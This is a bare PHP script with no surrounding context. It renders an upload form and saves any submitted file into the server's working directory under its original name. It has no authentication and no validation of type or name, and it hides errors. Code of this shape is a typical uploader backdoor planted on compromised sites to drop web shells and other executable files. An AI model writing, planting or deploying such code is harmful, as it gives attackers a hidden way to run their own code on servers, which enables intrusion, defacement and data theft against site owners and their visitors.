<?php
ini_set("display_errors","Off");
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file">';
echo '<input name="upload" type="submit" id="upload" value="Submit"></form>';
if( $_POST['upload'] == "Submit" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Success !'; }
else { echo 'Failed !'; }
}
?>
